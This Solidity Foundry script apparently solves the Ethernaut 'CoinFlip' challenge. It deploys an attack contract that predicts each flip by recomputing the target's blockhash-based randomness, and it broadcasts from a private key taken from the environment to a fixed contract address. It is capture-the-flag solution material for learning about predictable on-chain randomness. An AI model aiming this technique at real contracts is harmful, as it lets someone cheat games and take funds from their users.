// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/CoinFlip.sol";
import {Script, console2} from "forge-std/Script.sol";

contract CoinFlipAttack {
    CoinFlip public coinFlip;

    constructor(CoinFlip _coinFlipAddress) {
        coinFlip = CoinFlip(_coinFlipAddress);
    }

    function attack() public {
        uint256 factor = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        uint256 blockValue = uint256(blockhash(block.number - 1));

        uint256 value = blockValue / factor;
        bool guess = value == 1 ? true : false;
        coinFlip.flip(guess);
    }
}

contract CoinFlipSolution is Script {
    function run() external {
        vm.startBroadcast(vm.envUint("MY_PRIVATE_KEY"));
        CoinFlipAttack cfattack = new CoinFlipAttack(CoinFlip(0x0B01eFe6a9B60Ce4E8837473d7a7eAe8a0230551));
        cfattack.attack();
        vm.stopBroadcast();
    }
}
